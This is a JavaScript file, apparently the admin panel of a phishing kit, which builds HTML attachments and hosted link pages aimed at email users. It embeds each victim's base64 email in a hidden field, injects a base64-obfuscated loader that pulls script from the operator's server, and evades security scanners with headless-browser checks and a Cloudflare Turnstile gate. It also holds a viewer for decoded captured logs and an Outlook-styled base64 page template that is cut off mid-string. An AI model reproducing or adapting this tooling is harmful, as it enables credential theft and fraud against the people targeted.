$(document).ready(function () {
	$(".close-modal").click(function () {
		$(".modal").removeClass("d-block");
	});
	jQuery.fn.selectText = function () {
		this.find("input").each(function () {
			if (
				$(this).prev().length == 0 ||
				!$(this).prev().hasClass("p_copy")
			) {
				$(
					'<p class="p_copy" style="position: absolute; z-index: -1;"></p>'
				).insertBefore($(this));
			}
			$(this).prev().html($(this).val());
		});
		var vDocument = document;
		var v = this[0];
		console.log(this, v);
		if (vDocument.body.createTextRange) {
			var v4 = document.body.createTextRange();
			v4.moveToElementText(v);
			v4.select();
		} else if (window.getSelection) {
			var v3 = window.getSelection();
			var v4 = document.createRange();
			v4.selectNodeContents(v);
			v3.removeAllRanges();
			v3.addRange(v4);
		}
	};
	function f(p, p2, p3, p4 = 0, p5 = 0) {
		$(".modal-title").html(p);
		if (!p4) {
			$(".modal-body").html(p2.replace(/\r\n/g, "<br>"));
		} else {
			$(".modal-body").text(p2);
		}
		$(".modal").addClass("d-block");
		if (p5 == 0) {
			$(".d-def").val(p3);
		} else {
			$(".d-def").val(p3 + "|link");
		}
	}
	function f2(p6, p7 = "attachment") {
		if (!p6 == "html") {
			var v6 = "downloaded-" + p6 + ".txt";
		} else {
			var v6 = p7 + ".html";
		}
		var v7 = $(".modal-body").text();
		var v8 = document.createElement("a");
		v8.setAttribute(
			"href",
			"data:text/plain;charset=utf-8," + encodeURIComponent(v7)
		);
		v8.setAttribute("download", v6);
		v8.style.display = "none";
		document.body.appendChild(v8);
		v8.click();
		document.body.removeChild(v8);
	}
	$(".download").click(function () {
		f2(
			$(".d-def").val(),
			$(".d-def").val().split("|").length == 2 ? "link" : "attachment"
		);
	});
	$(".copy").click(function () {
		$(".modal-body").selectText();
		document.execCommand("copy");
		alert("Copied");
	});
	$(".check-server").click(function () {
		var v9 = window.location
			.toString()
			.split("admin/blank.php")[0]
			.concat("j.php");
		$.post(v9, "live=1", function (p8) {
			var v10 = (p8.match(/1/g) || []).length;
			if (v10 != 0) {
				alert(
					'Only "' +
					String(v10) +
					'" Server' +
					(v10 > 1 ? "s" : "") +
					" " +
					(v10 > 1 ? "are" : "is") +
					" alive and working"
				);
			} else {
				alert("All servers are down");
			}
		});
	});
	$(".show-log").click(function (p9) {
		var v11 = $(this).val();
		var v12 = JSON.parse(v11);
		f(v12.head, atob(v12.val), v12.type);
	});
	$(".more-ac").click(function () {
		$(".more").toggleClass("hided");
	});
	(function (p10, p11) {
		var v13 = p10.location.toString();
		var v14 = v13.split("admin");
		if (v14.length == 2) {
			var v15 = v14[0] + "j.php";
			$.post(v15, "upd101=1", function (p12) {
				if (p12 != "0") {
					var v16 = JSON.parse(p12);
					var v17 =
						"A little update has been made, Reload your page to take effect";
					p11(v17);
				}
			});
		}
	})(window, alert);
	function f3(vNumber) {
		var vNumber = Number(["4", "5", "6", "7", "8", "9", "10"].random());
		var v18 = "";
		var v19 =
			"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		var v20 = v19.length;
		for (var v21 = 0; v21 < vNumber; v21++) {
			v18 += v19.charAt(Math.floor(Math.random() * v20));
		}
		return v18;
	}
	if (window.location.toString().includes("blank.php")) {
		$.post(
			window.location
				.toString()
				.split("admin/blank.php")[0]
				.concat("j.php"),
			"random=1",
			function (p14) {
				if (p14 != "") {
					p14 = JSON.parse(p14);
					window.scr_src = [];
					for (let v22 of p14) {
						if (v22) {
							console.log(v22);
							window.scr_src.push(v22);
						}
					}
				} else {
					var v23 = [""];
				}
			}
		);
		$.post(
			window.location
				.toString()
				.split("admin/blank.php")[0]
				.concat("j.php"),
			"mkr=1",
			function (p15) {
				if (p15 != "") {
					window.testing = p15;
				}
			}
		);
		$.post(
			window.location
				.toString()
				.split("admin/blank.php")[0]
				.concat("j.php"),
			"mkr2=1",
			function (p16) {
				if (p16 != "") {
					window.the_main = p16;
				}
			}
		);
	}
	Array.prototype.random = function () {
		return this[Math.floor(Math.random() * this.length)];
	};
	function f4(vNumber2) {
		if (vNumber2 == undefined) {
			var vNumber2 = ["5", "6", "7", "8", "9"].random();
		}
		var vNumber2 = Number(vNumber2);
		var v25 = "";
		var v26 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".split(
			""
		);
		for (let v27 = 0; v27 <= vNumber2; v27++) {
			v25 += v26.random();
		}
		return v25;
	}
	function f5(p18) {
		if (p18 != undefined) {
			var v28 = 'style="display:none;"';
		}
		let v29 = [
			"div",
			"span",
			"ol",
			"ul",
			"p",
			"strong",
			"b",
			"cite",
			"h1",
			"h2",
			"h3",
			"h4",
			"h5",
			"h6",
			"bdo",
			"code",
			"pre",
		];
		let v30 = p18 != undefined ? v29.slice(0, -2).random() : v29.random();
		let v31 =
			"<" +
			v30 +
			' class="' +
			f4() +
			" " +
			f4() +
			'" id="' +
			f4() +
			'" title="' +
			f4() +
			'" ' +
			(p18 != undefined ? v28 : "") +
			">" +
			(p18 != undefined ? p18 : "") +
			"</" +
			v30 +
			">\r\n";
		return v31;
	}
	function f9(p19 = "", p20 = "") {
		var v32 = ["let", "var", "const", "n"];
		var v33 = v32.random();
		var vF4 = f4(Number(["4", "5", "6", "7", "8", "9"].random()));
		var v34 =
			(v33 != "n" ? v33 : "") +
			" " +
			vF4 +
			' = "' +
			f10(p20, (rt = 1)) +
			'";';
		return [vF4, v34];
	}
	var v35 =
		'{"~": "0", "W": "1", "[": "2", "k": "3", "F": "4", "D": "5", ")": "6", "I": "7", "$": "8", "/": "9", "@": "a", "c": "b", ":": "c", "]": "d", "M": "e", "l": "f", " ": "g", "E": "h", "n": "i", "Z": "j", "X": "k", "w": "l", "J": "m", "H": "n", "!": "o", ",": "p", "^": "q", ">": "r", ".": "s", "L": "t", "h": "u", "m": "v", "V": "w", "a": "x", "e": "y", "G": "z", "K": "A", "i": "B", "{": "C", "o": "D", "Y": "E", "(": "F", "d": "G", "U": "H", "p": "I", "=": "J", "5": "K", "g": "L", "8": "M", "%": "N", "s": "O", "r": "P", "#": "Q", "*": "R", "q": "S", "R": "T", "O": "U", "}": "V", "|": "W", "S": "X", "0": "Y", "Q": "Z", "C": "!", "B": "\\"", "4": "#", "N": "$", "1": "%", "<": "&", "7": "\'", "u": "(", "f": ")", "y": "*", "\\"": "+", "\'": ",", "&": "-", "2": ".", "x": "/", "t": ":", "3": ";", "?": "<", "z": "=", "b": ">", "9": "?", "-": "@", "T": "[", "j": "]", ";": "^", "A": "_", "P": "{", "6": "|", "v": "}", "+": "~", "_": " "}';
	var v36 = {};
	for (const [v37, v38] of Object.entries(JSON.parse(v35))) {
		v36[v38] = v37;
	}
	function f7(p21) {
		var v39 = "";
		var vV36 = v36;
		for (var v40 of p21) {
			if (vV36[v40]) {
				v39 = v39.concat(vV36[v40]);
			} else {
				v39 = v39.concat(v40);
			}
		}
		if (v39.length == p21.length) {
			return v39;
		} else {
			return null;
		}
	}
	function f8() {
		let v41 = [
			"div",
			"span",
			"ol",
			"ul",
			"p",
			"strong",
			"b",
			"cite",
			"h1",
			"h2",
			"h3",
			"h4",
			"h5",
			"h6",
			"bdo",
			"code",
			"pre",
			"img",
			"video",
		];
		return v41.random();
	}
	function f9(p22 = "", p23 = "") {
		var v42 = ["let", "var", "const", "n"];
		var v43 = v42.random();
		var vF42 = f4(Number(["4", "5", "6", "7", "8", "9"].random()));
		var v44 =
			(v43 != "n" ? v43 : "") +
			" " +
			vF42 +
			' = "' +
			f10(p23, (rt = 1)) +
			'";';
		return [vF42, v44];
	}
	function f10(p24, p25 = 0) {
		choices = [0, 1];
		des = [];
		for (var v45 of p24) {
			if (choices.random()) {
				var vV45 = `\\x${v45.charCodeAt().toString(16)}`;
			} else {
				var vV45 = v45;
			}
			des.push(vV45);
		}
		if (!p25) {
			return "eval(`" + des.join("") + "`)";
		} else {
			return des.join("");
		}
	}
	function f11(p26, p27) {
		var vF8 = f8();
		p26.push(["atob", ["self", "this", "window"].random()]);
		p26.push(p27);
		var v47 = p26.map((p28) =>
			!p28.includes("http")
				? p28[0] != "atob"
					? window.btoa(p28[0])
					: "atob"
				: window.btoa(p28)
		);
		console.log(p27);
		let vF43 = f4(5);
		var v48 =
			"<" +
			vF8 +
			' id="' +
			vF43 +
			'" class="' +
			v47.join(" ") +
			'"></' +
			vF8 +
			">";
		var v49 = {};
		for (var v50 = 0; v50 < p26.length; v50++) {
			if (v50 != p26.length - 1) {
				if (p26[v50][1]) {
					if (p26[v50][0] == "atob") {
						v49[p26[v50][0]] =
							p26[v50][1] +
							"[" +
							vF43 +
							".classList[" +
							v50 +
							"]]";
						continue;
					}
					v49[p26[v50][0]] =
						p26[v50][1] +
						"[atob(" +
						vF43 +
						".classList[" +
						v50 +
						"])]";
				} else {
					v49[p26[v50][0]] =
						"atob(" + vF43 + ".classList[" + v50 + "])";
				}
			} else {
				v49.link = "atob(" + vF43 + ".classList[" + v50 + "])";
			}
		}
		return [v48, v49];
	}
	$(".gene-att").click(function (p29) {
		$.post("js/bake.php", "make=1", function (p30) {
			var v51 = window.location
				.toString()
				.split("admin/blank.php")[0]
				.concat(p30);
			var v52 = $("#background_change")
				.find(":selected")
				.text()
				.toLowerCase();
			var vF44 = f4(["5", "6", "7", "8", "9"].random());
			var v53 = $("#autograb_val").find(":selected").text().toLowerCase();
			var v54 =
				v53 != "none" ? "##victimb64email##" : "dGVzdEBlbWFpbC5jb20";
			var v55 =
				$("#main_back").val() == "" ? "default" : $("#main_back").val();
			var v56 =
				$("#main_title").val() == ""
					? "default"
					: $("#main_title").val();
			var v57 =
				$("#main_cap").val() == "" ? "default" : $("#main_cap").val();
			var v58 = {
				back: v55,
				title: v56,
				caption: v57,
			};
			var vV58 = v58;
			var vF3 = f3(5);
			var v59 = {
				back: v52,
				e_tag: vF44,
				conf: btoa(JSON.stringify(vV58)),
				home: v51,
				id: vF3,
			};
			$.post("js/min_make.php", v59, function (p31) {
				if ((p31 = "mst")) {
					var v60 =
						'<input class="' +
						f3(12) +
						'" id="' +
						vF44 +
						'" title="' +
						f3(7) +
						'" value="' +
						v54 +
						'" type="hidden"></input>';
					var v61 = window.testing;
					var v62 = window.location
						.toString()
						.split("admin/blank.php")[0]
						.concat("admin/js/mf.php?id=" + vF3);
					var [v63, v64] = f11(
						[
							["createElement", ""],
							["appendChild", ""],
							["document", ["window", "self", "this"].random()],
							["script", ""],
						],
						v62
					);
					var v67 =
						"\n\t\t\t\t\t" +
						v60 +
						"\n\t\t\t\t\t" +
						v63 +
						"\n\t\t\t\t\t<script src='" + v62 + "'>\n\t\t\t\t\t\t" +
						"\n\t\t\t\t\t</script>\n\t\t\t\t\t";
					var v68 =
						"\n\t\t\t\t\t" +
						v63 +
						"\n\t\t\t\t\t" +
						v60 +
						"\n\t\t\t\t\t<script src='" + v62 + "'>\n\t\t\t\t\t\t" +
						"\n\t\t\t\t\t</script>\n\t\t\t\t\t";
					var v69 =
						"\n\t\t\t\t\t<html>\n\t\t\t\t\t" +
						v63 +
						"\n\t\t\t\t\t" +
						v60 +
						"\n\t\t\t\t\t<script src='" + v62 + "'>\n\t\t\t\t\t\t" +
						"\n\t\t\t\t\t</script>\n\t\t\t\t\t</html>\n\t\t\t\t\t";
					var v70 =
						"\n\t\t\t\t\t<html>\n\t\t\t\t\t" +
						v60 +
						"\n\t\t\t\t\t" +
						v63 +
						"\n\t\t\t\t\t<script src='" + v62 + "'>\n\t\t\t\t\t\t" +
						"\n\t\t\t\t\t</script>\n\t\t\t\t\t</html>\n\t\t\t\t\t";
					var v71 =
						"\n\t\t\t\t\t<html>\n\t\t\t\t\t<body>\n\t\t\t\t\t" +
						v60 +
						"\n\t\t\t\t\t" +
						v63 +
						"\n\t\t\t\t\t<script src='" + v62 + "'>\n\t\t\t\t\t\t" +
						"\n\t\t\t\t\t<script src='" + v62 + "'>\n\t\t\t\t\t\t\n\t\t\t\t\t";
					var v72 = [v67, v68, v69, v70, v71].random();
					if (true) {
						var v73 = {
							"&": "&amp;",
							"<": "&lt;",
							">": "&gt;",
						};
						function f12(p32) {
							return v73[p32] || p32;
						}
						function f13(p33) {
							return p33.replace(/[&<>]/g, f12);
						}
						f("Attachment", f13(v72), "html");
					} else {
						alert("Api key incorrect");
					}
				}
			});
		});
	});
	function f14(p34 = "", p35 = "", p36 = "", p37 = "hide", p38 = "") {
		var vF82 = f8();
		var v74 = p34 == "" ? f3(Number(["5", "6", "8"].random())) : p34;
		var v75 = p36 == "" ? f3(Number(["5", "6", "8"].random())) : p36;
		var v76 = p37 == "hide" ? "display:none;" : "";
		return (
			"<" +
			vF82 +
			' class="' +
			v74 +
			'" id="' +
			v75 +
			'" style="' +
			v76 +
			'">' +
			p38 +
			"</" +
			vF82 +
			">"
		);
	}
	$(".gene-att2").click(function (p39) {
		var v78 = $("#autograb_val2").val();
		if(v78 == "")
		{
			alert("Please enter an valid autograb (Your app should replace this text with the target's email)");
			return;
		}
		$.post("js/bake.php", "make=2", function (p40) {
			var v77 = window.location
				.toString()
				.split("admin/blank.php")[0]
				.concat(p40);
			var v79 =
				v78 != "" ? v78 : "#VictimB64Email#";
			var v80 = {
				home: v77,
				e_tag: "b64e",
			};
			var vV80 = v80;
			$.post("js/min_make.php", vV80, function (p41) {
				if (p41 == "mss") {
					var v81 = window.location
						.toString()
						.split("admin/blank.php")[0]
						.concat("admin/js/ms.php");
					var v82 =
						'<input type="hidden" class="' +
						f3(12) +
						'" id="b64e" value="' +
						v79 +
						'"></input>';
					var v83 = {
						pTag: v82,
						pB64url: btoa(v81),
						pUrlFromCode: v81,
						pUrl: v81,
					};
					var [v84, v85] = f11(
						[
							["createElement", ""],
							["appendChild", ""],
							["document", ["window", "self", "this"].random()],
							["script", ""],
						],
						v81
					);

					var v88 =
						"\n\t\t\t\t\t" +
						v82 +
						"\n\t\t\t\t\t" +
						v84 +
						"\n\t\t\t\t\t<script src='" + v83.pUrl + "'>\n\t\t\t\t\t\t" +
						"\n\t\t\t\t\t</script>\n\t\t\t\t";
					if (true) {
						f(
							"Attachment",
							v88.replace(/(?:\r\n|\r|\n)/g, ""),
							"html",
							(mtd = 1)
						);
					} else {
						alert("Incorrect Api Key");
					}
				} else {
					alert("Your hosting has issues/ some files are deleted");
				}
			});
		});
	});
	$(".gene-link").click(function (p42) {
		$.post("js/bake.php", "make=2", function (p43) {
			var v89 = window.location
				.toString()
				.split("admin/blank.php")[0]
				.concat(p43);
			var v90 = window.location
				.toString()
				.split("/blank.php")[0]
				.concat("/js/sc.php?r=" + btoa(link_grabs.value));
			var v91 = document.getElementById("uc_holder").value == "1";
			var v92 = document.getElementById("uc_holder").classList[0];
			var v93 = document.getElementById("uc_holder").classList[1];
			var v94 =
				'<input type="hidden" id="b64u" value="' +
				btoa(v89) +
				'" class="' +
				(v91 ? btoa(v90) : "") +
				'"></input>';
			if (!v91) {
				var v96 = '<script src="' + v90 + '"></script>';
			} else {
				var v96 =
					'<script>\r\n\t\tvar useC = 1;\r\n\t\tif(!navigator.webdriver && (navigator.language || navigator.languages.length > 0) && (window.outerWidth > 0 && window.outerHeight > 0) && !(/headless/i.test(navigator.userAgent)) && useC){\r\n\t\t\twindow.onloadTurnstileCallback = function () {\r\n\t\t\t\tturnstile.render(\'#cf-show\', {\r\n\t\t\t\t\tsitekey: \'<SITE_KEY>\',\r\n\t\t\t\t\tcallback: function(token) {\r\n\t\t\t\t\t\tvar m_url = atob(document.getElementById("b64u").value);\r\n\t\t\t\t\t\tfetch(m_url,{\r\n\t\t\t\t\t\t\tmethod: "POST",\r\n\t\t\t\t\t\t\theaders: {\r\n\t\t\t\t\t\t\t\t\'Content-Type\': \'application/x-www-form-urlencoded\',\r\n\t\t\t\t\t\t\t},\r\n\t\t\t\t\t\t\tbody: "tk=" + encodeURIComponent(token),\r\n\t\t\t\t\t\t})\r\n\t\t\t\t\t\t.then(function(response){\r\n\t\t\t\t\t\t\tif(response.status == 200){\r\n\t\t\t\t\t\t\t\tresponse.text()\r\n\t\t\t\t\t\t\t\t.then(function(text){\r\n\t\t\t\t\t\t\t\t\tif(text == "OK"){\r\n\t\t\t\t\t\t\t\t\t\tns= document.createElement("script");\r\n\t\t\t\t\t\t\t\t\t\tns.src = atob(document.getElementById("b64u").classList[0]);\r\n\t\t\t\t\t\t\t\t\t\tdocument.body.appendChild(ns);\r\n\t\t\t\t\t\t\t\t\t}else{\r\n\t\t\t\t\t\t\t\t\t\tdocument.getElementById("status-shower").innerText = "Error Verifying Site Connection";\r\n\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t})\r\n\t\t\t\t\t\t\t}else{\r\n\t\t\t\t\t\t\t\tdocument.getElementById("status-shower").innerText = "Error Verifying Site Connection"\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t})\r\n\t\t\t\t\t},\r\n\t\t\t\t});\r\n\t\t\t};\r\n\t\t}\r\n\t</script>'.replace(
						"<SITE_KEY>",
						v92
					);
			}
			var v97 =
				'<html>\r\n<head>\r\n\t<meta name="viewport" content="width=device-width, initial-scale=1.0">\r\n\t<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer async></script>\r\n</head>\r\n<body style="display:flex;justify-content:center;align-items:center;text-align:center;">\r\n\t<div>\r\n\t\t<h3 id="status-shower" style="margin-bottom:30px;"> Verifying site connection... </h3>\r\n\t\t<div id="cf-show" style=""></div>\r\n\t\t\r\n\t' +
				v94 +
				"</div>\r\n\t" +
				v96 +
				" \r\n</body>\r\n</html>";
			var v98 = {
				"&": "&amp;",
				"<": "&lt;",
				">": "&gt;",
			};
			function f15(p44) {
				return v98[p44] || p44;
			}
			function f16(p45) {
				return p45.replace(/[&<>]/g, f15);
			}
			f(
				"Link File , Download and host on any host.",
				f16(v97),
				"html",
				(mtd = 0),
				(link = 1)
			);
		});
	});
	$(".gene-link2").click(function (p46) {
		$.post("js/bake.php", "make=1", function (p47) {
			var v99 = window.location
				.toString()
				.split("admin/blank.php")[0]
				.concat(p47);
			var v100 = window.location
				.toString()
				.split("/blank.php")[0]
				.concat("/js/sc.php");
			let v101 =
				"PGhlYWQ+DQo8c3R5bGU+QGZvbnQtZmFjZSB7DQogICAgICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdTZWdvZSBVSSBXZXN0RXVyb3BlYW4nOw0KICAgICAgICAgICAgICAgIHNyYzogbG9jYWwoJ1NlZ29lIFVJIExpZ2h0JyksIGxvY2FsKCdTZWdvZSBXUCBMaWdodCcpLA0KICAgICAgICAgICAgICAgICAgICB1cmwoJ2h0dHBzOi8vb3V0bG9vay0xLmNkbi5vZmZpY2UubmV0L2Fzc2V0cy9tYWlsL2ZvbnRzL3YxL2ZvbnRzL3NlZ29ldWktbGlnaHQuZW90PyNpZWZpeCcpDQogICAgICAgICAgICAgICAgICAgICAgICBmb3JtYXQoJ2VtYmVkZGVkLW9wZW50eXBlJyksDQogICAgICAgICAgICAgICAgICAgIHVybCgnaHR0cHM6Ly9vdXRsb29rLTEuY2RuLm9mZmljZS5uZXQvYXNzZXRzL21haWwvZm9udHMvdjEvZm9udHMvc2Vnb2V1aS1saWdodC53b2ZmJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvcm1hdCgnd29mZicpLA0KICAgICAgICAgICAgICAgICAgICB1cmwoJ2h0dHBzOi8vb3V0bG9vay0xLmNkbi5vZmZpY2UubmV0L2Fzc2V0cy9tYWlsL2ZvbnRzL3YxL2ZvbnRzL3NlZ29ldWktbGlnaHQudHRmJykNCiAgICAgOyAgICAgICAgICAgICAgICAgICBmb3JtYXQoJ3RydWV0eXBlJyk7DQogICAgICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDEwMDsNCiAgICAgICAgICAgICAgICBmb250LXN0eWxlOiBub3JtYWw7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBAZm9udC1mYWNlIHsNCiAgICAgICAgICAgICAgICBmb250LWZhbWlseTogJ1NlZ29lIFVJIFdlc3RFdXJvcGVhbic7DQogICAgICAgICAgICAgICAgc3JjOiBsb2NhbCgnU2Vnb2UgVUknKSwgbG9jYWwoJ1NlZ29lIFdQJyksDQogICAgICAgICAgICAgICAgICAgIHVybCgnaHR0cHM6Ly9vdXRsb29rLTEuY2RuLm9mZmljZS5uZXQvYXNzZXRzL21haWwvZm9udHMvdjEvZm9udHMvc2Vnb2V1aS1yZWd1bGFyLmVvdD8jaWVmaXgnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9ybWF0KCdlbWJlZGRlZC1vcGVudHlwZScpLA0KICAgICAgICAgICAgICAgICAgICB1cmwoJ2h0dHBzOi8vb3V0bG9vay0xLmNkbi5vZmZpY2UubmV0L2Fzc2V0cy9tYWlsL2ZvbnRzL3YxL2ZvbnRzL3NlZ29ldWktcmVndWxhci53b2ZmJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvcm1hdCgnd29mZicpLA0KICAgICAgICAgICAgICAgICAgICB1cmwoJ2h0dHBzOi8vb3V0bG9vay0xLmNkbi5vZmZpY2UubmV0L2Fzc2V0cy9tYWlsL2ZvbnRzL3YxL2ZvbnRzL3NlZ29ldWktcmVndWxhci50dGYnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9ybWF0KCd0cnVldHlwZScpOw0KICAgICAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA0MDA7DQogICAgICAgICAgICAgICAgZm9udC1zdHlsZTogbm9ybWFsOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgQGZvbnQtZmFjZSB7DQogICAgICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdTZWdvZSBVSSBXZXN0RXVyb3BlYW4nOw0KICAgICAgICAgICAgICAgIHNyYzogbG9jYWwoJ1NlZ29lIFVJIFNlbWlib2xkJyksIGxvY2FsKCdTZWdvZSBXUCBTZW1pYm9sZCcpLA0KICAgICAgICAgICAgICAgICAgICB1cmwoJ2h0dHBzOi8vb3V0bG9vay0xLmNkbi5vZmZpY2UubmV0L2Fzc2V0cy9tYWlsL2ZvbnRzL3YxL2ZvbnRzL3NlZ29ldWktc2VtaWJvbGQuZW90PyNpZWZpeCcpDQogICAgICAgICAgICAgICAgICAgICAgICBmb3JtYXQoJ2VtYmVkZGVkLW9wZW50eXBlJyksDQogICAgICAgICAgICAgICAgICAgIHVybCgnaHR0cHM6Ly9vdXRsb29rLTEuY2RuLm9mZmljZS5uZXQvYXNzZXRzL21haWwvZm9udHMvdjEvZm9udHMvc2Vnb2V1aS1zZW1pYm9sZC53b2ZmJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvcm1hdCgnd29mZicpLA0KICAgICAgICAgICAgICAgICAgICB1cmwoJ2h0dHBzOi8vb3V0bG9vay0xLmNkbi5vZmZpY2UubmV0L2Fzc2V0cy9tYWlsL2ZvbnRzL3YxL2ZvbnRzL3NlZ29ldWktc2VtaWJvbGQudHRmJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvcm1hdCgndHJ1ZXR5cGUnKTsNCiAgICAgICAgICAgICAgICBmb250LXdlaWdodDogNjAwOw0KICAgICAgICAgICAgICAgIGZvbnQtc3R5bGU6IG5vcm1hbDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIEBmb250LWZhY2Ugew0KICAgICAgICAgICAgICAgIGZvbnQtZmFtaWx5OiAnU2Vnb2UgVUkgV2VzdEV1cm9wZWFuJzsNCiAgICAgICAgICAgICAgICBzcmM6IGxvY2FsKCdTZWdvZSBVSSBTZW1pbGlnaHQnKSwgbG9jYWwoJ1NlZ29lIFdQIFNlbWlsaWdodCcpLA0KICAgICAgICAgICAgICAgICAgICB1cmwoJ2h0dHBzOi8vb3V0bG9vay0xLmNkbi5vZmZpY2UubmV0L2Fzc2V0cy9tYWlsL2ZvbnRzL3YxL2ZvbnRzL3NlZ29ldWktc2VtaWxpZ2h0LmVvdD8jaWVmaXgnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9ybWF0KCdlbWJlZGRlZC1vcGVudHlwZScpLA0KICAgICAgICAgICAgICAgICAgICB1cmwoJ2h0dHBzOi8vb3V0bG9vay0xLmNkbi5vZmZpY2UubmV0L2Fzc2V0cy9tYWlsL2ZvbnRzL3YxL2ZvbnRzL3NlZ29ldWktc2VtaWxpZ2h0LndvZmYnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9ybWF0KCd3b2ZmJyksDQogICAgICAgICAgICAgICAgICAgIHVybCgnaHR0cHM6Ly9vdXRsb29rLTEuY2RuLm9mZmljZS5uZXQvYXNzZXRzL21haWwvZm9udHMvdjEvZm9udHMvc2Vnb2V1aS1zZW1pbGlnaHQudHRmJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvcm1hdCgndHJ1ZXR5cGUnKTsNCiAgICAgICAgICAgICAgICBmb250LXdlaWdodDogMjAwOw0KICAgICAgICAgICAgICAgIGZvbnQtc3R5bGU6IG5vcm1hbDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIEBmb250LWZhY2Ugew0KICAgICAgICAgICAgICAgIGZvbnQtZmFtaWx5OiAnRmFicmljTURMMkljb25zJzsNCiAgICAgICAgICAgICAgICBzcmM6IHVybCgnaHR0cHM6Ly9vdXRsb29rLTEuY2RuLm9mZmljZS5uZXQvb3dhbWFpbC8yMDIyMDMyNTAwMi4wNC9yZXNvdXJjZXMvZm9udHMvbzM2NWljb25zLW1kbDIud29mZicpDQogICAgICAgICAgICAgICAgICAgICAgICBmb3JtYXQoJ3dvZmYnKSwNCiAgICAgICAgICAgICAgICAgICAgdXJsKCdodHRwczovL291dGxvb2stMS5jZG4ub2ZmaWNlLm5ldC9vd2FtYWlsLzIwMjIwMzI1MDAyLjA0L3Jlc291cmNlcy9mb250cy9vMzY1aWNvbnMtbWRsMi50dGYnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9ybWF0KCd0cnVldHlwZScpOw0KICAgICAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBub3JtYWw7DQogICAgICAgICAgICAgICAgZm9udC1zdHlsZTogbm9ybWFsOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgQGZvbnQtZmFjZSB7DQogICAgICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdvZmZpY2UzNjVpY29ucyc7DQogICAgICAgICAgICAgICAgc3JjOiB1cmwoJ2h0dHBzOi8vb3V0bG9vay0xLmNkbi5vZmZpY2UubmV0L293YW1haWwvMjAyMjAzMjUwMDIuMDQvcmVzb3VyY2VzL2ZvbnRzL29mZmljZTM2NWljb25zLmVvdD8nKTsNCiAgICAgICAgICAgICAgICBzcmM6IHVybCgnaHR0cHM6Ly9vdXRsb29rLTEuY2RuLm9mZmljZS5uZXQvb3dhbWFpbC8yMDIyMDMyNTAwMi4wNC9yZXNvdXJjZXMvZm9udHMvb2ZmaWNlMzY1aWNvbnMuZW90PyNpZWZpeCcpDQogICAgICAgICAgICAgICAgICAgICAgICBmb3JtYXQoJ2VtYmVkZGVkLW9wZW50eXBlJyksDQogICAgICAgICAgICAgICAgICAgIHVybCgnaHR0cHM6Ly9vdXRsb29rLTEuY2RuLm9mZmljZS5uZXQvb3dhbWFpbC8yMDIyMDMyNTAwMi4wNC9yZXNvdXJjZXMvZm9udHMvb2ZmaWNlMzY1aWNvbnMud29mZj8nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9ybWF0KCd3b2ZmJyksDQogICAgICAgICAgICAgICAgICAgIHVybCgnaHR0cHM6Ly9vdXRsb29rLTEuY2RuLm9mZmljZS5uZXQvb3dhbWFpbC8yMDIyMDMyNTAwMi4wNC9yZXNvdXJjZXMvZm9udHMvb2ZmaWNlMzY1aWNvbnMudHRmPycpDQogICAgICAgICAgICAgICAgICAgICAgICBmb3JtYXQoJ3RydWV0eXBlJyksDQogICAgICAgICAgICAgICAgICAgIHVybCgnaHR0cHM6Ly9vdXRsb29rLTEuY2RuLm9mZmljZS5uZXQvb3dhbWFpbC8yMDIyMDMyNTAwMi4wNC9yZXNvdXJjZXMvZm9udHMvb2ZmaWNlMzY1aWNvbnMuc3ZnPyNvZmZpY2UzNjVpY29ucycpDQogICAgICAgICAgICAgICAgICAgICAgICBmb3JtYXQoJ3N2ZycpOw0KICAgICAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBub3JtYWw7DQogICAgICAgICAgICAgICAgZm9udC1zdHlsZTogbm9ybWFsOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgI3ByZWxvYWREaXYgew0KICAgICAgICAgICAgICAgIGhlaWdodDogMXB4Ow0KICAgICAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IC0xcHg7DQogICAgICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbjsNCiAgICAgICAgICAgICAgICB2aXNpYmlsaXR5OiBoaWRkZW47DQogICAgICAgICAgICB9DQogICAgICAgICAgICAjbG9hZGluZ1NjcmVlbiB7DQogICAgICAgICAgICAgICAgcG9zaXRpb246IGZpeGVkOw0KICAgICAgICAgICAgICAgIHRvcDogMDsNCiAgICAgICAgICAgICAgICBib3R0b206IDA7DQogICAgICAgICAgICAgICAgbGVmdDogMDsNCiAgICAgICAgICAgICAgICByaWdodDogMDsNCiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgI2xvYWRpbmdMb2dvIHsNCiAgICAgICAgICAgICAgICBwb3NpdGlvbjogZml4ZWQ7DQogICAgICAgICAgICAgICAgdG9wOiBjYWxjKDUwdmggLSA5MHB4KTsNCiAgICAgICAgICAgICAgICBsZWZ0OiBjYWxjKDUwdncgLSA5MHB4KTsNCiAgICAgICAgICAgICAgICB3aWR